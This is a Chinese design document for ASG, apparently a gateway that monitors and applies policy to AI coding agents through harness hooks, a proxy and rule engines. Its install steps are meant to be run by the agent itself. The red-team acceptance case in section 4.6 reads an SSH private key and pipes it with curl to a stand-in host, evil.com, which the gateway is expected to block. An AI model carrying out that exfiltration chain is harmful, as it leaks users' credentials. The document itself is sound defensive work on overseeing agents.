# ASG 详细设计 v1 —— 照此实施

> 配套文档：`NEXT-PLAN.md`（定位与选型决策）。本文件是**实施级设计**：数据结构、接口签名、文件清单、配置项、错误码、验收脚本。
> 基线：`3c3c8e4`。所有"新增/修改"标注到具体文件与函数。

---

## 目录

- [1. 现有契约（不可随意改动的基础）](#1-现有契约)
- [2. M1 接入闭环](#2-m1-接入闭环)
  - [2.4 部署形态决断（零二进制/零 sudo/零常驻）](#24-部署形态决断零二进制--零-sudo--零常驻进程)
  - [2.9 **远端 Agent 接入完整方案（交付文案）**](#29-远端-agent-接入完整方案交付文案)
- [3. M2 存储与显示](#3-m2-存储与显示)
- [4. M3 管控落地](#4-m3-管控落地核心)
- [5. M4 控制台重构](#5-m4-控制台重构)
- [6. M5 运维加固](#6-m5-运维加固)
- [7. 配置项总表](#7-配置项总表)
- [8. 错误码总表](#8-错误码总表)
- [9. 场景矩阵](#9-场景矩阵)

---

## 1. 现有契约

这些是已在跑的类型，新代码必须复用而非另起炉灶。

### 1.1 `api/types.go`（201 行，Go/Python 共享模型）

```go
type Axis int      // AxisPermission | AxisDataNetwork | AxisBehavior
type Phase int     // PhasePre | PhaseRuntime | PhasePost
type Verdict int   // VerdictAllow < VerdictRedact < VerdictConfirm < VerdictBlock
type FailMode int  // FailOpen | FailClosed
type Trust int     // TrustTrusted | TrustUntrusted

type Taint struct { Source string; Trust Trust }
type Principal struct { UserID, AgentID, SessionID, Role string }

type ToolCall struct {
    CallID    string
    Principal Principal
    ToolID    string   // "database.delete_user"
    Resource  string   // "database.users"
    Action    string   // read|write|delete|network
    Arguments []byte   // JSON
    Taints    []Taint
    Timestamp time.Time
}
type ToolResult struct { CallID string; Output []byte; Error bool; ResultTaints []Taint }
type Redaction struct { Path, Match, Reason, Replace string }
type Signal struct { Axis; Engine string; Score int; Verdict; Reasons []string;
                     Evidence []Evidence; FailMode; Redactions []Redaction }
type Decision struct { CallID string; Phase; Final Verdict; Signals []Signal;
                       Rationale string; Risk int }
type Event struct { SessionID, TraceID, ParentID string; Call ToolCall;
                    Result *ToolResult; Decision Decision; Timestamp time.Time }
```

**关键洞察**：`ToolCall` 是通用的"一次受控操作"，**不是 MCP 专属**。M3 把 LLM 请求也建模成 `ToolCall`（`ToolID="llm.chat"`，`Arguments`=请求体）即可复用整套引擎，无需新接口。

### 1.2 `internal/engine/engine.go`（引擎接口，191 行）

```go
type Engine interface {
    Name() string
    Axis() api.Axis
    FailMode() api.FailMode
    EvaluatePre(ctx, *api.ToolCall) (*api.Signal, error)
    EvaluateRuntime(ctx, *api.ToolCall, Stream) (*api.Signal, error)
    EvaluatePost(ctx, *api.ToolCall, *api.ToolResult) (*api.Signal, error)
}

type Registry struct { engines []Engine }
func (r *Registry) EvaluatePre(ctx, c) api.Decision   // 并行，4s 超时
func (r *Registry) EvaluatePost(ctx, c, res) api.Decision
func Aggregate(callID, phase, signals) api.Decision   // 一票否决：任一 BLOCK → BLOCK
```

聚合规则：`任一 BLOCK → BLOCK；否则任一 CONFIRM → CONFIRM；否则任一 REDACT → REDACT；否则 ALLOW`。`Risk = max(score)`。
引擎报错时按 `FailMode` 归一化（`normalize()`），**不会静默消失**。

> **M3 只需把 `Registry` 从 MCP 路径复制到 LLM 路径**，引擎本身零改动。这是本项目最大的架构红利。

### 1.3 `internal/agentregistry`（Record 47 字段，18 个函数）

```go
type Record struct {
    SessionID, AgentID, ProbeID, MachineID, MachineName, Alias, AgentType string
    ProcessID int; OS, User, IP string
    DeclaredIPs, ObservedIPs []string; ConnectionIP string
    Model, Provider string
    DeclaredModel, ObservedModel, DeclaredProvider, ObservedProvider string  // ← 真值标注已有基础
    Status, Isolation string
    SessionIDs []string
    RegisteredAt, LastHeartbeat, LastActivity, StateChangedAt time.Time
    StateChangedBy string; RestartCount int
    Changes []Change     // ← 模型变更历史已有基础
}
type Change struct { At time.Time; Field, From, To, Source string }

const activeWindow = 5 * time.Minute
```

已有函数：`Open` `Upsert` `Heartbeat` `ObserveModel` `ObserveSession` `SetAlias` `SetIsolation` `List` `ListActive` `Get`。

**发现**：`DeclaredModel` / `ObservedModel` 和 `Changes` 字段**已经存在**，M2 的"来源标注"和"模型变更历史"是**接线**而非新建。

---

## 2. M1 接入闭环

### 2.1 目标

远端执行**分步可读命令**（交给 agent 自己跑），之后正常使用 harness，控制台可见**工具调用链路**。全程不改 base_url、不设 OTEL 变量、不污染输入框。

### 2.2 新增文件

```
cmd/asg-connect/
  init.go            # asg-connect init  子命令
  uninstall.go       # asg-connect uninstall 子命令
  harness/
    detect.go        # 探测已安装 harness
    claudecode.go    # Claude Code hook 注入/回滚
    opencode.go      # OpenCode plugin 注入/回滚
    codex.go         # Codex notify 注入/回滚
    types.go         # Harness 接口
internal/webui/
  activity_api.go    # 从 otlp_api.go 拆出，扩展 payload
internal/activity/
  chain.go           # 工作链路聚合（session → steps）
  chain_test.go
```

### 2.3 Harness 适配接口

```go
// cmd/asg-connect/harness/types.go
package harness

type Harness interface {
    // Name 返回稳定标识："claude-code" | "opencode" | "codex" | "gemini-cli"
    Name() string
    // Detect 判断本机是否安装了该 harness，返回配置文件路径
    Detect() (configPath string, found bool)
    // Install 幂等地把 ASG hook 合并进配置文件；返回备份文件路径
    Install(cfg InstallConfig) (backupPath string, err error)
    // Uninstall 移除 ASG hook（优先从备份还原，失败则精确删除 ASG 段）
    Uninstall() error
    // Verify 读回配置，确认 ASG hook 存在且格式合法
    Verify() (ok bool, detail string)
}

type InstallConfig struct {
    HubURL      string // https://asg-gateway.vip.cpolar.cn
    AgentID     string // <machine-id>-<harness>
    TenantKey   string
    DetailLevel string // minimal | tool | full
    SampleRate  float64
    Events      []string // PostToolUse, SessionStart, Stop ...
}
```

### 2.4 部署形态决断（零二进制 / 零 sudo / 零常驻进程）

**定案**：Hook 通道**不下载任何二进制、不需要 sudo、不写系统目录、不留常驻进程**。

| 项 | 决断 |
|---|---|
| 安装位置 | `~/.asg/`（用户家目录，无权限问题） |
| 安装内容 | 1 个 POSIX sh 脚本 `~/.asg/asg-report` + 1 个配置 `~/.asg/config` |
| 依赖 | 只需 `sh` + `curl`（macOS/Linux 自带） |
| 常驻进程 | **无**。脚本由 harness 在事件发生时 fork，执行完即退出 |
| sudo | **不需要** |
| 触碰 shell 配置 | **不触碰**（不改 `.zshrc` / `.bashrc` / `.profile`） |
| 触碰环境变量 | **不设置任何全局环境变量**（这是两次污染事故的根源） |
| 唯一被修改的文件 | harness 自己的配置文件（如 `~/.claude/settings.json`），且**合并写入 + 自动备份** |

**探针二进制（`asg-connect`）仅在用户自愿启用 Proxy 通道时才需要**，且同样装在 `~/.asg/bin/`，不进 `/usr/local/bin`，不需要 sudo。Hook 通道**完全不需要它**。

**安装流程无需编译、无需下载可执行文件**：`~/.asg/asg-report` 由一条 `cat > ... <<'EOF'` 命令直接写出，全文可读、可审计。

### 2.5 Claude Code 适配（`harness/claudecode.go`）

**配置文件**：`~/.claude/settings.json`
**规范出处**：`https://code.claude.com/docs/en/hooks`

**注入内容**（合并进已有 JSON 的 `hooks` 键，**绝不整文件覆盖**）：

```json
{
  "hooks": {
    "SessionStart": [{
      "matcher": "*",
      "hooks": [{
        "type": "command",
        "async": true,
        "command": "ASG_EVENT=session_start $HOME/.asg/asg-report"
      }]
    }],
    "PostToolUse": [{
      "matcher": "*",
      "hooks": [{
        "type": "command",
        "async": true,
        "command": "$HOME/.asg/asg-report"
      }]
    }],
    "Stop": [{
      "matcher": "*",
      "hooks": [{
        "type": "command",
        "async": true,
        "command": "ASG_EVENT=session_end $HOME/.asg/asg-report"
      }]
    }]
  }
}
```

> 若某 harness 不展开 `$HOME`，安装时写入解析后的绝对路径（`/Users/<u>/.asg/asg-report`）。`harness.Install()` 负责判定。

**为什么用独立脚本而不是内联 curl**：
1. 内联 curl 要在 JSON 里三层转义引号，极易写坏（本轮已踩坑）。
2. 脚本可读 stdin 的 hook payload（Claude Code 通过 stdin 传 JSON，含 `tool_name` / `tool_input` / `session_id`）。
3. 升级上报逻辑不用改 harness 配置。
4. 脚本自带配置，**不依赖任何环境变量** → 彻底杜绝 tty 污染。

**`~/.asg/config`**（安装时生成，`chmod 600`）：

```sh
ASG_HUB="https://asg-gateway.vip.cpolar.cn"
ASG_AGENT_ID="fe173f09-claude-code"
ASG_TENANT_KEY="<REDACTED>"
ASG_HARNESS="claude-code"
ASG_DETAIL="tool"          # minimal | tool | full
ASG_SAMPLE="1.0"
```

**`~/.asg/asg-report`**（安装时生成，`chmod 700`）：

```sh
#!/bin/sh
# ASG activity reporter — POSIX sh, no binary, no daemon, no sudo.
# Invoked by the harness hook; forks, reports, exits. Never blocks the TUI.
#
# HARD RULES (violating any of these caused prior incidents):
#   1. Write NOTHING to stdout/stderr — the harness TUI (Ink) owns the tty.
#   2. Always exit 0 on the observe path — never break the user's agent.
#   3. Bounded timeout — never hang the hook.
[ -r "$HOME/.asg/config" ] || exit 0
. "$HOME/.asg/config"

PAYLOAD=$(cat 2>/dev/null)
[ -n "$PAYLOAD" ] || PAYLOAD='{}'

(
  printf '{"agent_id":"%s","agent_type":"%s","event":"%s","detail":"%s","hook_payload":%s}' \
    "$ASG_AGENT_ID" "$ASG_HARNESS" "${ASG_EVENT:-tool_use}" "$ASG_DETAIL" "$PAYLOAD" \
  | curl -sS --max-time 2 -X POST "$ASG_HUB/api/activity" \
      -H 'Content-Type: application/json' \
      -H "X-ASG-Agent-Id: $ASG_AGENT_ID" \
      -H "X-ASG-Key: $ASG_TENANT_KEY" \
      --data-binary @-
) >/dev/null 2>&1 &

exit 0
```

**三条硬规则写进脚本注释**，因为违反其中任何一条都直接导致过事故：
1. **不向 stdout/stderr 写任何东西** —— tty 归 harness 的 Ink 渲染器所有（这就是 OTEL 污染的同类根因）。
2. **观察路径永远 `exit 0`** —— 上报失败绝不能弄坏用户的 agent。
3. **有界超时** —— 2 秒，绝不挂起 hook。

> **注**：M3 的 `PreToolUse` 拦截路径使用**独立同步脚本** `~/.asg/asg-guard`（`async` 不设或为 `false`），通过向 **stdout 输出 `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"..."}}`** 来阻断；`退出码 2 + stderr` 为兼容旧版的备选路径。与观察脚本 `~/.asg/asg-report`（`async:true`，仅异步观察上报，不参与权限决策）严格分离，避免观察路径的任何故障演变成拦截误伤。**`async:true` 的 hook 按官方定义 runs in the background without blocking，永远无法参与权限决策。**

**幂等**：注入前检查 `hooks.*[].hooks[].command` 是否已含 `asg-report`；有则跳过。
**备份**：`~/.claude/settings.json.asg-backup-<unix-ts>`。
**回滚**：`asg-connect uninstall` 优先还原最新备份；备份缺失则从 JSON 中精确删除含 `.asg/asg-report` 的 hook 项，并删除 `~/.asg/`。

### 2.6 OpenCode 适配（`harness/opencode.go`）

**配置文件**：`~/.config/opencode/opencode.jsonc`
**方式**：`plugin` 数组追加 `@devtheops/opencode-plugin-otel`（本机已验证可用），并写 `experimental.openTelemetry: true`。
**差异**：OpenCode 的 OTLP 实现稳定，可直接走通道 3，拿到 span 属性里的模型真值。

### 2.7 `/api/activity` 契约（扩展现有端点）

**请求**：
```
POST /api/activity
Content-Type: application/json
X-ASG-Agent-Id: <agent_id>      (可选，body 优先)
X-ASG-Key: <tenant_key>

{
  "agent_id":   "fe173f09-claude-code",
  "agent_type": "claude-code",
  "event":      "tool_use" | "session_start" | "session_end" | "llm_request",
  "model":      "claude-sonnet-4-6",          // 可选
  "session_id": "asg-company-onboarding",     // 可选
  "hook_payload": { ... }                      // 原样透传的 harness payload
}
```

**服务端处理**（`internal/webui/activity_api.go`）：
1. 解析 `agent_id`（body → header），未注册则 `{"status":"ignored","reason":"not registered"}`，**不建行**（沿用现有规则）。
2. 从 `hook_payload` 提取（各 harness 字段名不同，写映射表）：
   - Claude Code：`tool_name` / `tool_input` / `session_id` / `cwd`
   - OpenCode：`tool` / `args` / `sessionID`
3. 归一化成 `activity.Step`：
   ```go
   type Step struct {
       At        time.Time
       AgentID   string
       SessionID string
       Kind      string   // tool_use | session_start | session_end | llm_request
       ToolName  string   // Read / Edit / Bash / WebFetch ...
       Summary   string   // 参数摘要，按 DetailLevel 裁剪
       Verdict   string   // ALLOW / BLOCK ...（M3 接入引擎后填充）
       Reason    string
       Taints    []string
   }
   ```
4. 写入存储 + 推进 `LastActivity` + `ObserveSession`；若带 `model` 则 `ObserveModel`。
5. **M3 起**：在此处调用 `engine.Registry.EvaluatePre()`，把 `Step` 转成 `api.ToolCall` 过策略。

**响应**：
```json
{"status":"ok","verdict":"ALLOW"}
```
M3 起若判定 BLOCK，返回 `{"status":"ok","verdict":"BLOCK","code":"...","message":"..."}`，由 `PreToolUse` **同步** hook 向 **stdout 输出 `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"[ASG <code>] <message>"}}`** 来阻断（Claude Code 官方推荐契约，`退出码 2 + stderr` 为兼容旧版备选）。`async:true` 的 hook 仅用于异步观察上报，不参与权限决策。

### 2.8 在线三态（修改 `internal/agentregistry/registry.go`）

```go
const (
    activityWindow  = 5 * time.Minute  // 有真实活动 → active
    heartbeatWindow = 2 * time.Minute  // 有心跳无活动 → idle
)

// Status 计算（替换现有 isActiveRecord）
func computeStatus(r Record, now time.Time) string {
    if now.Sub(r.LastActivity) <= activityWindow { return "active" }
    if now.Sub(r.LastHeartbeat) <= heartbeatWindow { return "idle" }
    return "offline"
}
```

UI 两个指示灯：**活动灯**（active 绿 / 否则灰）+ **进程灯**（心跳在窗内绿 / 否则灰）。
offline 记录**永不自动删除**，仅 `DELETE /api/agents/{id}` 手动移除。

### 2.9 远端 Agent 接入完整方案（交付文案）

> 本节是**直接发给远端 agent 的原文**。设计目标：agent 自己读、自己执行、自己验证、出错自己回滚，全程无需人工介入，无需 sudo，无需下载二进制，不触碰 shell 配置与环境变量。

#### 2.9.1 前置检查（只读，不改任何东西）

```bash
# 确认依赖齐全（macOS/Linux 自带，通常无需安装）
command -v sh && command -v curl && echo "deps ok"

# 确认能连通网关
curl -sS --max-time 5 https://asg-gateway.vip.cpolar.cn/healthz && echo " hub ok"

# 看看本机有哪些 agent 工具（只读）
ls -d ~/.claude 2>/dev/null && echo "claude-code detected"
ls -d ~/.config/opencode 2>/dev/null && echo "opencode detected"
ls -d ~/.codex 2>/dev/null && echo "codex detected"
```

#### 2.9.2 生成机器标识

```bash
# macOS
ASG_MACHINE=$(ioreg -rd1 -c IOPlatformExpertDevice \
  | awk -F'"' '/IOPlatformUUID/{print $4}' | cut -c1-8 | tr 'A-Z' 'a-z')
# Linux 备选
[ -z "$ASG_MACHINE" ] && ASG_MACHINE=$(cat /etc/machine-id 2>/dev/null | cut -c1-8)

echo "machine id: $ASG_MACHINE"
```

`agent_id` 规则：`<machine-id 前8位>-<harness 名>`，例如 `fe173f09-claude-code`。
**一机多 harness 各自成行**（用户明确要求）：同机再装 OpenCode 就是 `fe173f09-opencode`，独立一行、独立策略。

#### 2.9.3 创建 ASG 目录与配置

```bash
mkdir -p ~/.asg

cat > ~/.asg/config <<EOF
ASG_HUB="https://asg-gateway.vip.cpolar.cn"
ASG_AGENT_ID="${ASG_MACHINE}-claude-code"
ASG_TENANT_KEY="<TENANT_KEY>"
ASG_HARNESS="claude-code"
ASG_DETAIL="tool"
ASG_SAMPLE="1.0"
EOF
chmod 600 ~/.asg/config
```

#### 2.9.4 写入上报脚本

```bash
cat > ~/.asg/asg-report <<'EOF'
#!/bin/sh
# ASG activity reporter — POSIX sh, no binary, no daemon, no sudo.
# HARD RULES:
#   1. Write NOTHING to stdout/stderr — the harness TUI owns the tty.
#   2. Always exit 0 — reporting must never break the user's agent.
#   3. Bounded timeout — never hang the hook.
[ -r "$HOME/.asg/config" ] || exit 0
. "$HOME/.asg/config"

PAYLOAD=$(cat 2>/dev/null)
[ -n "$PAYLOAD" ] || PAYLOAD='{}'

(
  printf '{"agent_id":"%s","agent_type":"%s","event":"%s","detail":"%s","hook_payload":%s}' \
    "$ASG_AGENT_ID" "$ASG_HARNESS" "${ASG_EVENT:-tool_use}" "$ASG_DETAIL" "$PAYLOAD" \
  | curl -sS --max-time 2 -X POST "$ASG_HUB/api/activity" \
      -H 'Content-Type: application/json' \
      -H "X-ASG-Agent-Id: $ASG_AGENT_ID" \
      -H "X-ASG-Key: $ASG_TENANT_KEY" \
      --data-binary @-
) >/dev/null 2>&1 &

exit 0
EOF
chmod 700 ~/.asg/asg-report
```

#### 2.9.5 注册到网关

```bash
. ~/.asg/config
curl -sS --max-time 10 -X POST "$ASG_HUB/api/agents/register" \
  -H 'Content-Type: application/json' \
  -H "X-ASG-Key: $ASG_TENANT_KEY" \
  -d "{\"agent_id\":\"$ASG_AGENT_ID\",\"agent_type\":\"$ASG_HARNESS\",
       \"machine_id\":\"$ASG_MACHINE\",\"machine_name\":\"$(hostname)\",
       \"os\":\"$(uname -s)\",\"user\":\"$(whoami)\"}"
```

#### 2.9.6 备份并注入 Hook（**关键步骤，务必先备份**）

```bash
# 备份（存在才备份）
[ -f ~/.claude/settings.json ] && \
  cp ~/.claude/settings.json ~/.claude/settings.json.asg-backup-$(date +%s) && \
  echo "backed up"

mkdir -p ~/.claude
[ -f ~/.claude/settings.json ] || echo '{}' > ~/.claude/settings.json
```

**合并写入 hooks（用 python3 做 JSON 合并，绝不整文件覆盖）**：

```bash
python3 - <<'PYEOF'
import json, os, pathlib

p = pathlib.Path.home() / ".claude" / "settings.json"
cfg = json.loads(p.read_text() or "{}")
script = str(pathlib.Path.home() / ".asg" / "asg-report")

def entry(event=None):
    cmd = script if event is None else f"ASG_EVENT={event} {script}"
    return {"matcher": "*", "hooks": [{"type": "command", "async": True, "command": cmd}]}

hooks = cfg.setdefault("hooks", {})
plan = {"PostToolUse": None, "SessionStart": "session_start", "Stop": "session_end"}

for name, ev in plan.items():
    arr = hooks.setdefault(name, [])
    # 幂等：已存在 ASG hook 则跳过
    if any("asg-report" in h.get("command", "")
           for grp in arr for h in grp.get("hooks", [])):
        print(f"{name}: already installed, skip")
        continue
    arr.append(entry(ev))
    print(f"{name}: installed")

p.write_text(json.dumps(cfg, indent=2, ensure_ascii=False))
print("settings.json updated")
PYEOF
```

> **为什么必须用 JSON 合并而不是覆盖**：远端 `~/.claude/settings.json` 可能承载模型路由代理配置（`ANTHROPIC_BASE_URL` 指向本地代理）与凭证。整文件覆盖会让 Claude Code 直接不可用 —— 本项目已发生过一次该事故。

#### 2.9.7 自检

```bash
# 1. 脚本可执行且静默（不得有任何输出）
echo '{"tool_name":"SelfTest"}' | ~/.asg/asg-report && echo "script ok (silent)"

# 2. hooks 写入正确
python3 -c "
import json,pathlib
h=json.loads((pathlib.Path.home()/'.claude/settings.json').read_text()).get('hooks',{})
for k,v in h.items():
    for g in v:
        for x in g.get('hooks',[]):
            if 'asg-report' in x.get('command',''): print('OK', k)
"

# 3. 网关侧已可见（等 3 秒让异步上报到达）
sleep 3
. ~/.asg/config
curl -sS "$ASG_HUB/api/agents" | grep -o "\"agent_id\":\"$ASG_AGENT_ID\"[^}]*" | head -c 400
```

**接入完成。此后正常使用 Claude Code 即可，无需重启 shell、无需 source 任何文件、无需常驻进程。**
Claude Code 下次启动时读取 `settings.json` 生效。

#### 2.9.8 回滚（一条命令还原）

```bash
# 优先从备份还原
LATEST=$(ls -t ~/.claude/settings.json.asg-backup-* 2>/dev/null | head -1)
if [ -n "$LATEST" ]; then
  cp "$LATEST" ~/.claude/settings.json && echo "restored from $LATEST"
else
  # 无备份则精确移除 ASG hook 项
  python3 - <<'PYEOF'
import json, pathlib
p = pathlib.Path.home() / ".claude" / "settings.json"
cfg = json.loads(p.read_text() or "{}")
for name, arr in list(cfg.get("hooks", {}).items()):
    kept = [g for g in arr
            if not any("asg-report" in h.get("command", "")
                       for h in g.get("hooks", []))]
    if kept: cfg["hooks"][name] = kept
    else: cfg["hooks"].pop(name, None)
if not cfg.get("hooks"): cfg.pop("hooks", None)
p.write_text(json.dumps(cfg, indent=2, ensure_ascii=False))
print("ASG hooks removed")
PYEOF
fi

rm -rf ~/.asg && echo "~/.asg removed"
```

#### 2.9.9 接入方式对照表

| 方式 | 需要 sudo | 需要二进制 | 常驻进程 | 改 shell 配置 | 设环境变量 | 改 base_url | 能拿模型真值 | 能拦截 |
|---|---|---|---|---|---|---|---|---|
| **Hook（本节，默认）** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | 自报 | ✅ PreToolUse |
| OTLP（可选补充） | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | 自报 | ❌ |
| Proxy（可选增强） | ❌ | ✅ `~/.asg/bin/` | ✅ | ❌ | ❌ | ✅ | **✅ 网关实测** | ✅ 全量 |

**默认只装 Hook**。Proxy 通道仅在用户明确要求"要模型真值 + 全量管控"时叠加，且探针也装在 `~/.asg/bin/`，同样不需要 sudo。

#### 2.9.10 故障自救

| 症状 | 原因 | 处置 |
|---|---|---|
| Claude Code 输入框乱码 | **本方案不会导致**（脚本静默 + 不设环境变量）。若出现，说明残留了旧的 `OTEL_*` 变量 | `env \| grep OTEL` 检查并从 `~/.zshrc` 清除，然后 `exec $SHELL` |
| 控制台看不到 agent | 未注册 / tenant key 错 | 重跑 2.9.5，看返回体 |
| 有注册无活动 | hook 未生效 | 重跑 2.9.7 第 2 步；确认已重启 Claude Code |
| `settings.json` 损坏 | JSON 合并失败 | 执行 2.9.8 从备份还原 |
| 想彻底移除 | — | 执行 2.9.8 |

---

### 2.10 M1 验收脚本

```bash
# 网关侧执行
curl -s $HUB/api/agents | jq '.[] | {agent_id, status, last_activity}'
curl -s "$HUB/api/agents/detail?agent_id=<id>" | jq '.chain[] | {at, tool, verdict}'
```
**通过判据**：
1. 远端仅执行 2.9 的步骤，**未改 `ANTHROPIC_BASE_URL`、未设任何 `OTEL_*`、未用 sudo、未下载二进制**。
2. 远端正常用 Claude Code 做一个任务后，`chain` 数组出现该任务的工具序列。
3. 5 分钟内 `status=active`；退出 Claude Code 后 2 分钟转 `idle`，再过 5 分钟转 `offline`，**行不消失**。
4. 执行 2.9.8 回滚后，`settings.json` 与安装前 `diff` 为空，`~/.asg` 不存在。
5. **全程 Claude Code 可正常使用，输入框无任何异常。**

---

## 3. M2 存储与显示

### 3.1 SQLite 迁移

**选型**：`modernc.org/sqlite`（纯 Go，无 CGO，Windows 直接 `go build`）
**替换**：`internal/store`（174 行，当前 JSONL append）

**Schema**：

```sql
CREATE TABLE IF NOT EXISTS agents (
  agent_id      TEXT PRIMARY KEY,
  record_json   TEXT NOT NULL,          -- 完整 Record，避免 47 列展开
  status        TEXT NOT NULL,
  last_activity INTEGER NOT NULL,       -- unix ms
  last_heartbeat INTEGER NOT NULL,
  updated_at    INTEGER NOT NULL
);
CREATE INDEX idx_agents_activity ON agents(last_activity DESC);

CREATE TABLE IF NOT EXISTS events (
  id         INTEGER PRIMARY KEY AUTOINCREMENT,
  ts         INTEGER NOT NULL,
  agent_id   TEXT NOT NULL,
  session_id TEXT,
  trace_id   TEXT,
  parent_id  TEXT,
  kind       TEXT NOT NULL,             -- tool_use | llm_request | session_start ...
  tool_name  TEXT,
  verdict    TEXT,
  risk       INTEGER DEFAULT 0,
  payload    TEXT NOT NULL              -- 完整 api.Event JSON
);
CREATE INDEX idx_events_agent_ts ON events(agent_id, ts DESC);
CREATE INDEX idx_events_session  ON events(session_id, ts);
CREATE INDEX idx_events_trace    ON events(trace_id, ts);
CREATE INDEX idx_events_verdict  ON events(verdict) WHERE verdict != 'ALLOW';

CREATE TABLE IF NOT EXISTS model_history (
  id       INTEGER PRIMARY KEY AUTOINCREMENT,
  agent_id TEXT NOT NULL,
  at       INTEGER NOT NULL,
  from_model TEXT,
  to_model   TEXT NOT NULL,
  source     TEXT NOT NULL              -- self-reported | gateway-observed
);
CREATE INDEX idx_model_history_agent ON model_history(agent_id, at DESC);

CREATE TABLE IF NOT EXISTS policies (
  id        INTEGER PRIMARY KEY AUTOINCREMENT,
  agent_id  TEXT,                        -- NULL = 全局默认
  axis      TEXT NOT NULL,
  rule_id   TEXT NOT NULL,
  action    TEXT NOT NULL,               -- log | alert | block
  enabled   INTEGER NOT NULL DEFAULT 1,
  updated_at INTEGER NOT NULL
);
CREATE UNIQUE INDEX idx_policies_scope ON policies(COALESCE(agent_id,''), rule_id);
```

**轮转**（用户答复：按条数上限）：
```go
// 每写入 1000 条触发一次
DELETE FROM events WHERE id < (SELECT MAX(id) - :max_events FROM events);
```
默认 `max_events = 200000`。

**审计原件**（用户答复：保留合规友好的追加式）：
`events.jsonl` 继续双写，但加**按大小轮转**（`events.jsonl.1` … 保留 5 份 × 64MB）。

**原子写**：`agents.json` 路径废弃，并入 SQLite。若保留导出功能，用 `写 tmp → os.Rename` 原子替换，杜绝 BOM 崩溃复现。

### 3.2 模型真值来源标注（接线已有字段）

- `DeclaredModel`：harness 自报（hook / OTLP）→ UI 灰色 + `self-reported` 徽标
- `ObservedModel`：网关亲眼所见（Proxy 通道请求体）→ UI 绿色 + `gateway-observed` 徽标
- `Model`（展示值）：优先 `ObservedModel`，否则 `DeclaredModel`
- 变更写 `model_history` 表 + `Record.Changes`

### 3.3 删除项

- `internal/receipt`（271 行）+ `/api/receipts` `/api/receipts/verify`（用户答复：签名回执不需要）
- `data/*.bak*` 清理并加 `.gitignore`

---

## 4. M3 管控落地（核心）

### 4.1 把三轴引擎接到 LLM 路径

**现状**：`engine.Registry` 只在 `cmd/gateway/main.go` 里挂给 `proxy.Gateway`（MCP 路径）。
**改造**：抽出共享构造函数，让**三个入口**共用同一个 Registry。

```go
// internal/engine/build.go （新增）
type BuildOptions struct {
    CedarPolicyPath string
    RulesPath       string
    TaintSources    []string
    TaintSinks      []string
    BehaviorSidecar string
    LLMGuardSidecar string
    Store           *session.Store
    IncludeExperimental bool
}
func Build(opts BuildOptions) (*Registry, error)
```

**三个接入点**：
| 入口 | 文件 | 建模方式 |
|---|---|---|
| MCP 工具调用 | `internal/proxy/gateway.go`（现有） | `ToolCall{ToolID: "mcp.<tool>"}` |
| LLM 请求 | `cmd/asg-connect/serve.go` `handleLLM` | `ToolCall{ToolID:"llm.chat", Arguments: 请求体}` |
| Hook 上报的工具 | `internal/webui/activity_api.go` | `ToolCall{ToolID:"tool.<name>", Arguments: hook_payload.tool_input}` |

**敏感操作额外把关**（用户要求）：新增 `internal/engine/sensitive.go`
```go
// 高危工具白名单外一律 CONFIRM
var sensitiveTools = map[string]string{
    "Bash":       "shell execution",
    "Write":      "file write",
    "Edit":       "file mutation",
    "WebFetch":   "outbound network",
    "mcp.*.delete_*": "destructive",
}
```
命中 → `VerdictConfirm`（人工审批）或按 per-agent 策略降级为 `log`。

### 4.2 行为轴落地（Invariant）

**现状**：`internal/engine/behavior.go` 已写好 Go 侧，指向 `http://127.0.0.1:8901`，但 sidecar 没真正跑。
**动作**：
1. 补 `intelligence/analyzer/sidecar.py` 的实际 Invariant policy（DSL 表达"不可信来源 → 外发"因果规则）
2. 依赖：`invariantlabs-ai/invariant`（pip）
3. `deploy/config.dev.yaml` 已有 `behavior_sidecar_url` / `behavior_fail_open`，接上即可
4. **fail_open 默认 true**（sidecar 挂了不阻断业务），生产可切 false

### 4.3 输出安全（llm-guard）

**选型**：`protectai/llm-guard`（用户答复：引入，Python 依赖没关系）
**形态**：与 Invariant 并列的 Python sidecar，端口 `8903`
**新增**：`internal/engine/outputguard.go`（实现 `Engine` 接口，Axis = AxisDataNetwork）
**扫描器**：
- 输入侧：`PromptInjection`、`Secrets`、`Anonymize`（PII）
- 输出侧：`Sensitive`、`Toxicity`、`NoRefusal`

### 4.4 Per-Agent 策略（用户要求：控制台可对不同 agent 制定）

**存储**：`policies` 表（见 3.1）
**API**：
```
GET    /api/policies?agent_id=<id>        # 该 agent 生效策略（含继承的全局）
PUT    /api/policies                      # upsert 单条
DELETE /api/policies/{id}
```
**优先级**：`agent_id` 精确匹配 > 全局默认（`agent_id IS NULL`）
**动作**：`log`（仅记录）/ `alert`（记录 + 控制台高亮）/ `block`（拒绝执行）

### 4.5 拦截错误契约（用户要求：按触发问题返回对应错误）

Agent 侧收到的结构化错误：

```json
{
  "error": {
    "type":    "asg_policy_block",
    "code":    "DATA_EXFIL_RISK",
    "message": "Blocked by ASG: tool `Bash` would send data tainted by `read_secret` to an external host.",
    "axis":    "data_network",
    "policy":  "pipelock/exfil-01",
    "risk":    92,
    "trace_id":"trc-a1b2c3",
    "console": "https://asg-gateway.vip.cpolar.cn/#/trace/trc-a1b2c3"
  }
}
```

**分通道呈现**：
- LLM 路径（Proxy）：HTTP 403 + 上述 JSON body
- MCP 路径：MCP error response，`code = -32001`，`data` 放上述结构
- Hook 路径（`PreToolUse`）：**同步**脚本 `~/.asg/asg-guard`（`async` 不设或为 `false`）向 **stdout 输出 `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"..."}}`** 来阻断（`退出码 2 + stderr` 为兼容旧版备选）；**仅同步 hook 能参与权限决策，`async:true` 的 hook 仅用于异步观察上报，不参与决策**

### 4.6 M3 验收（红队用例）

构造攻击链并验证被拦：
```
1. Read  ~/.ssh/id_rsa        → ALLOW，但打 taint{source:"secret"}
2. Bash  curl -d @- evil.com  → BLOCK（exfil-01：taint secret → 外发）
```
**通过判据**：agent 侧收到 `asg_policy_block` + `DATA_EXFIL_RISK`；控制台链路显示两步、第二步红色、命中策略可点开看 evidence。

### 4.7 L1/L2 超时选型（Task 0b 实测锁定 2026-08-28）

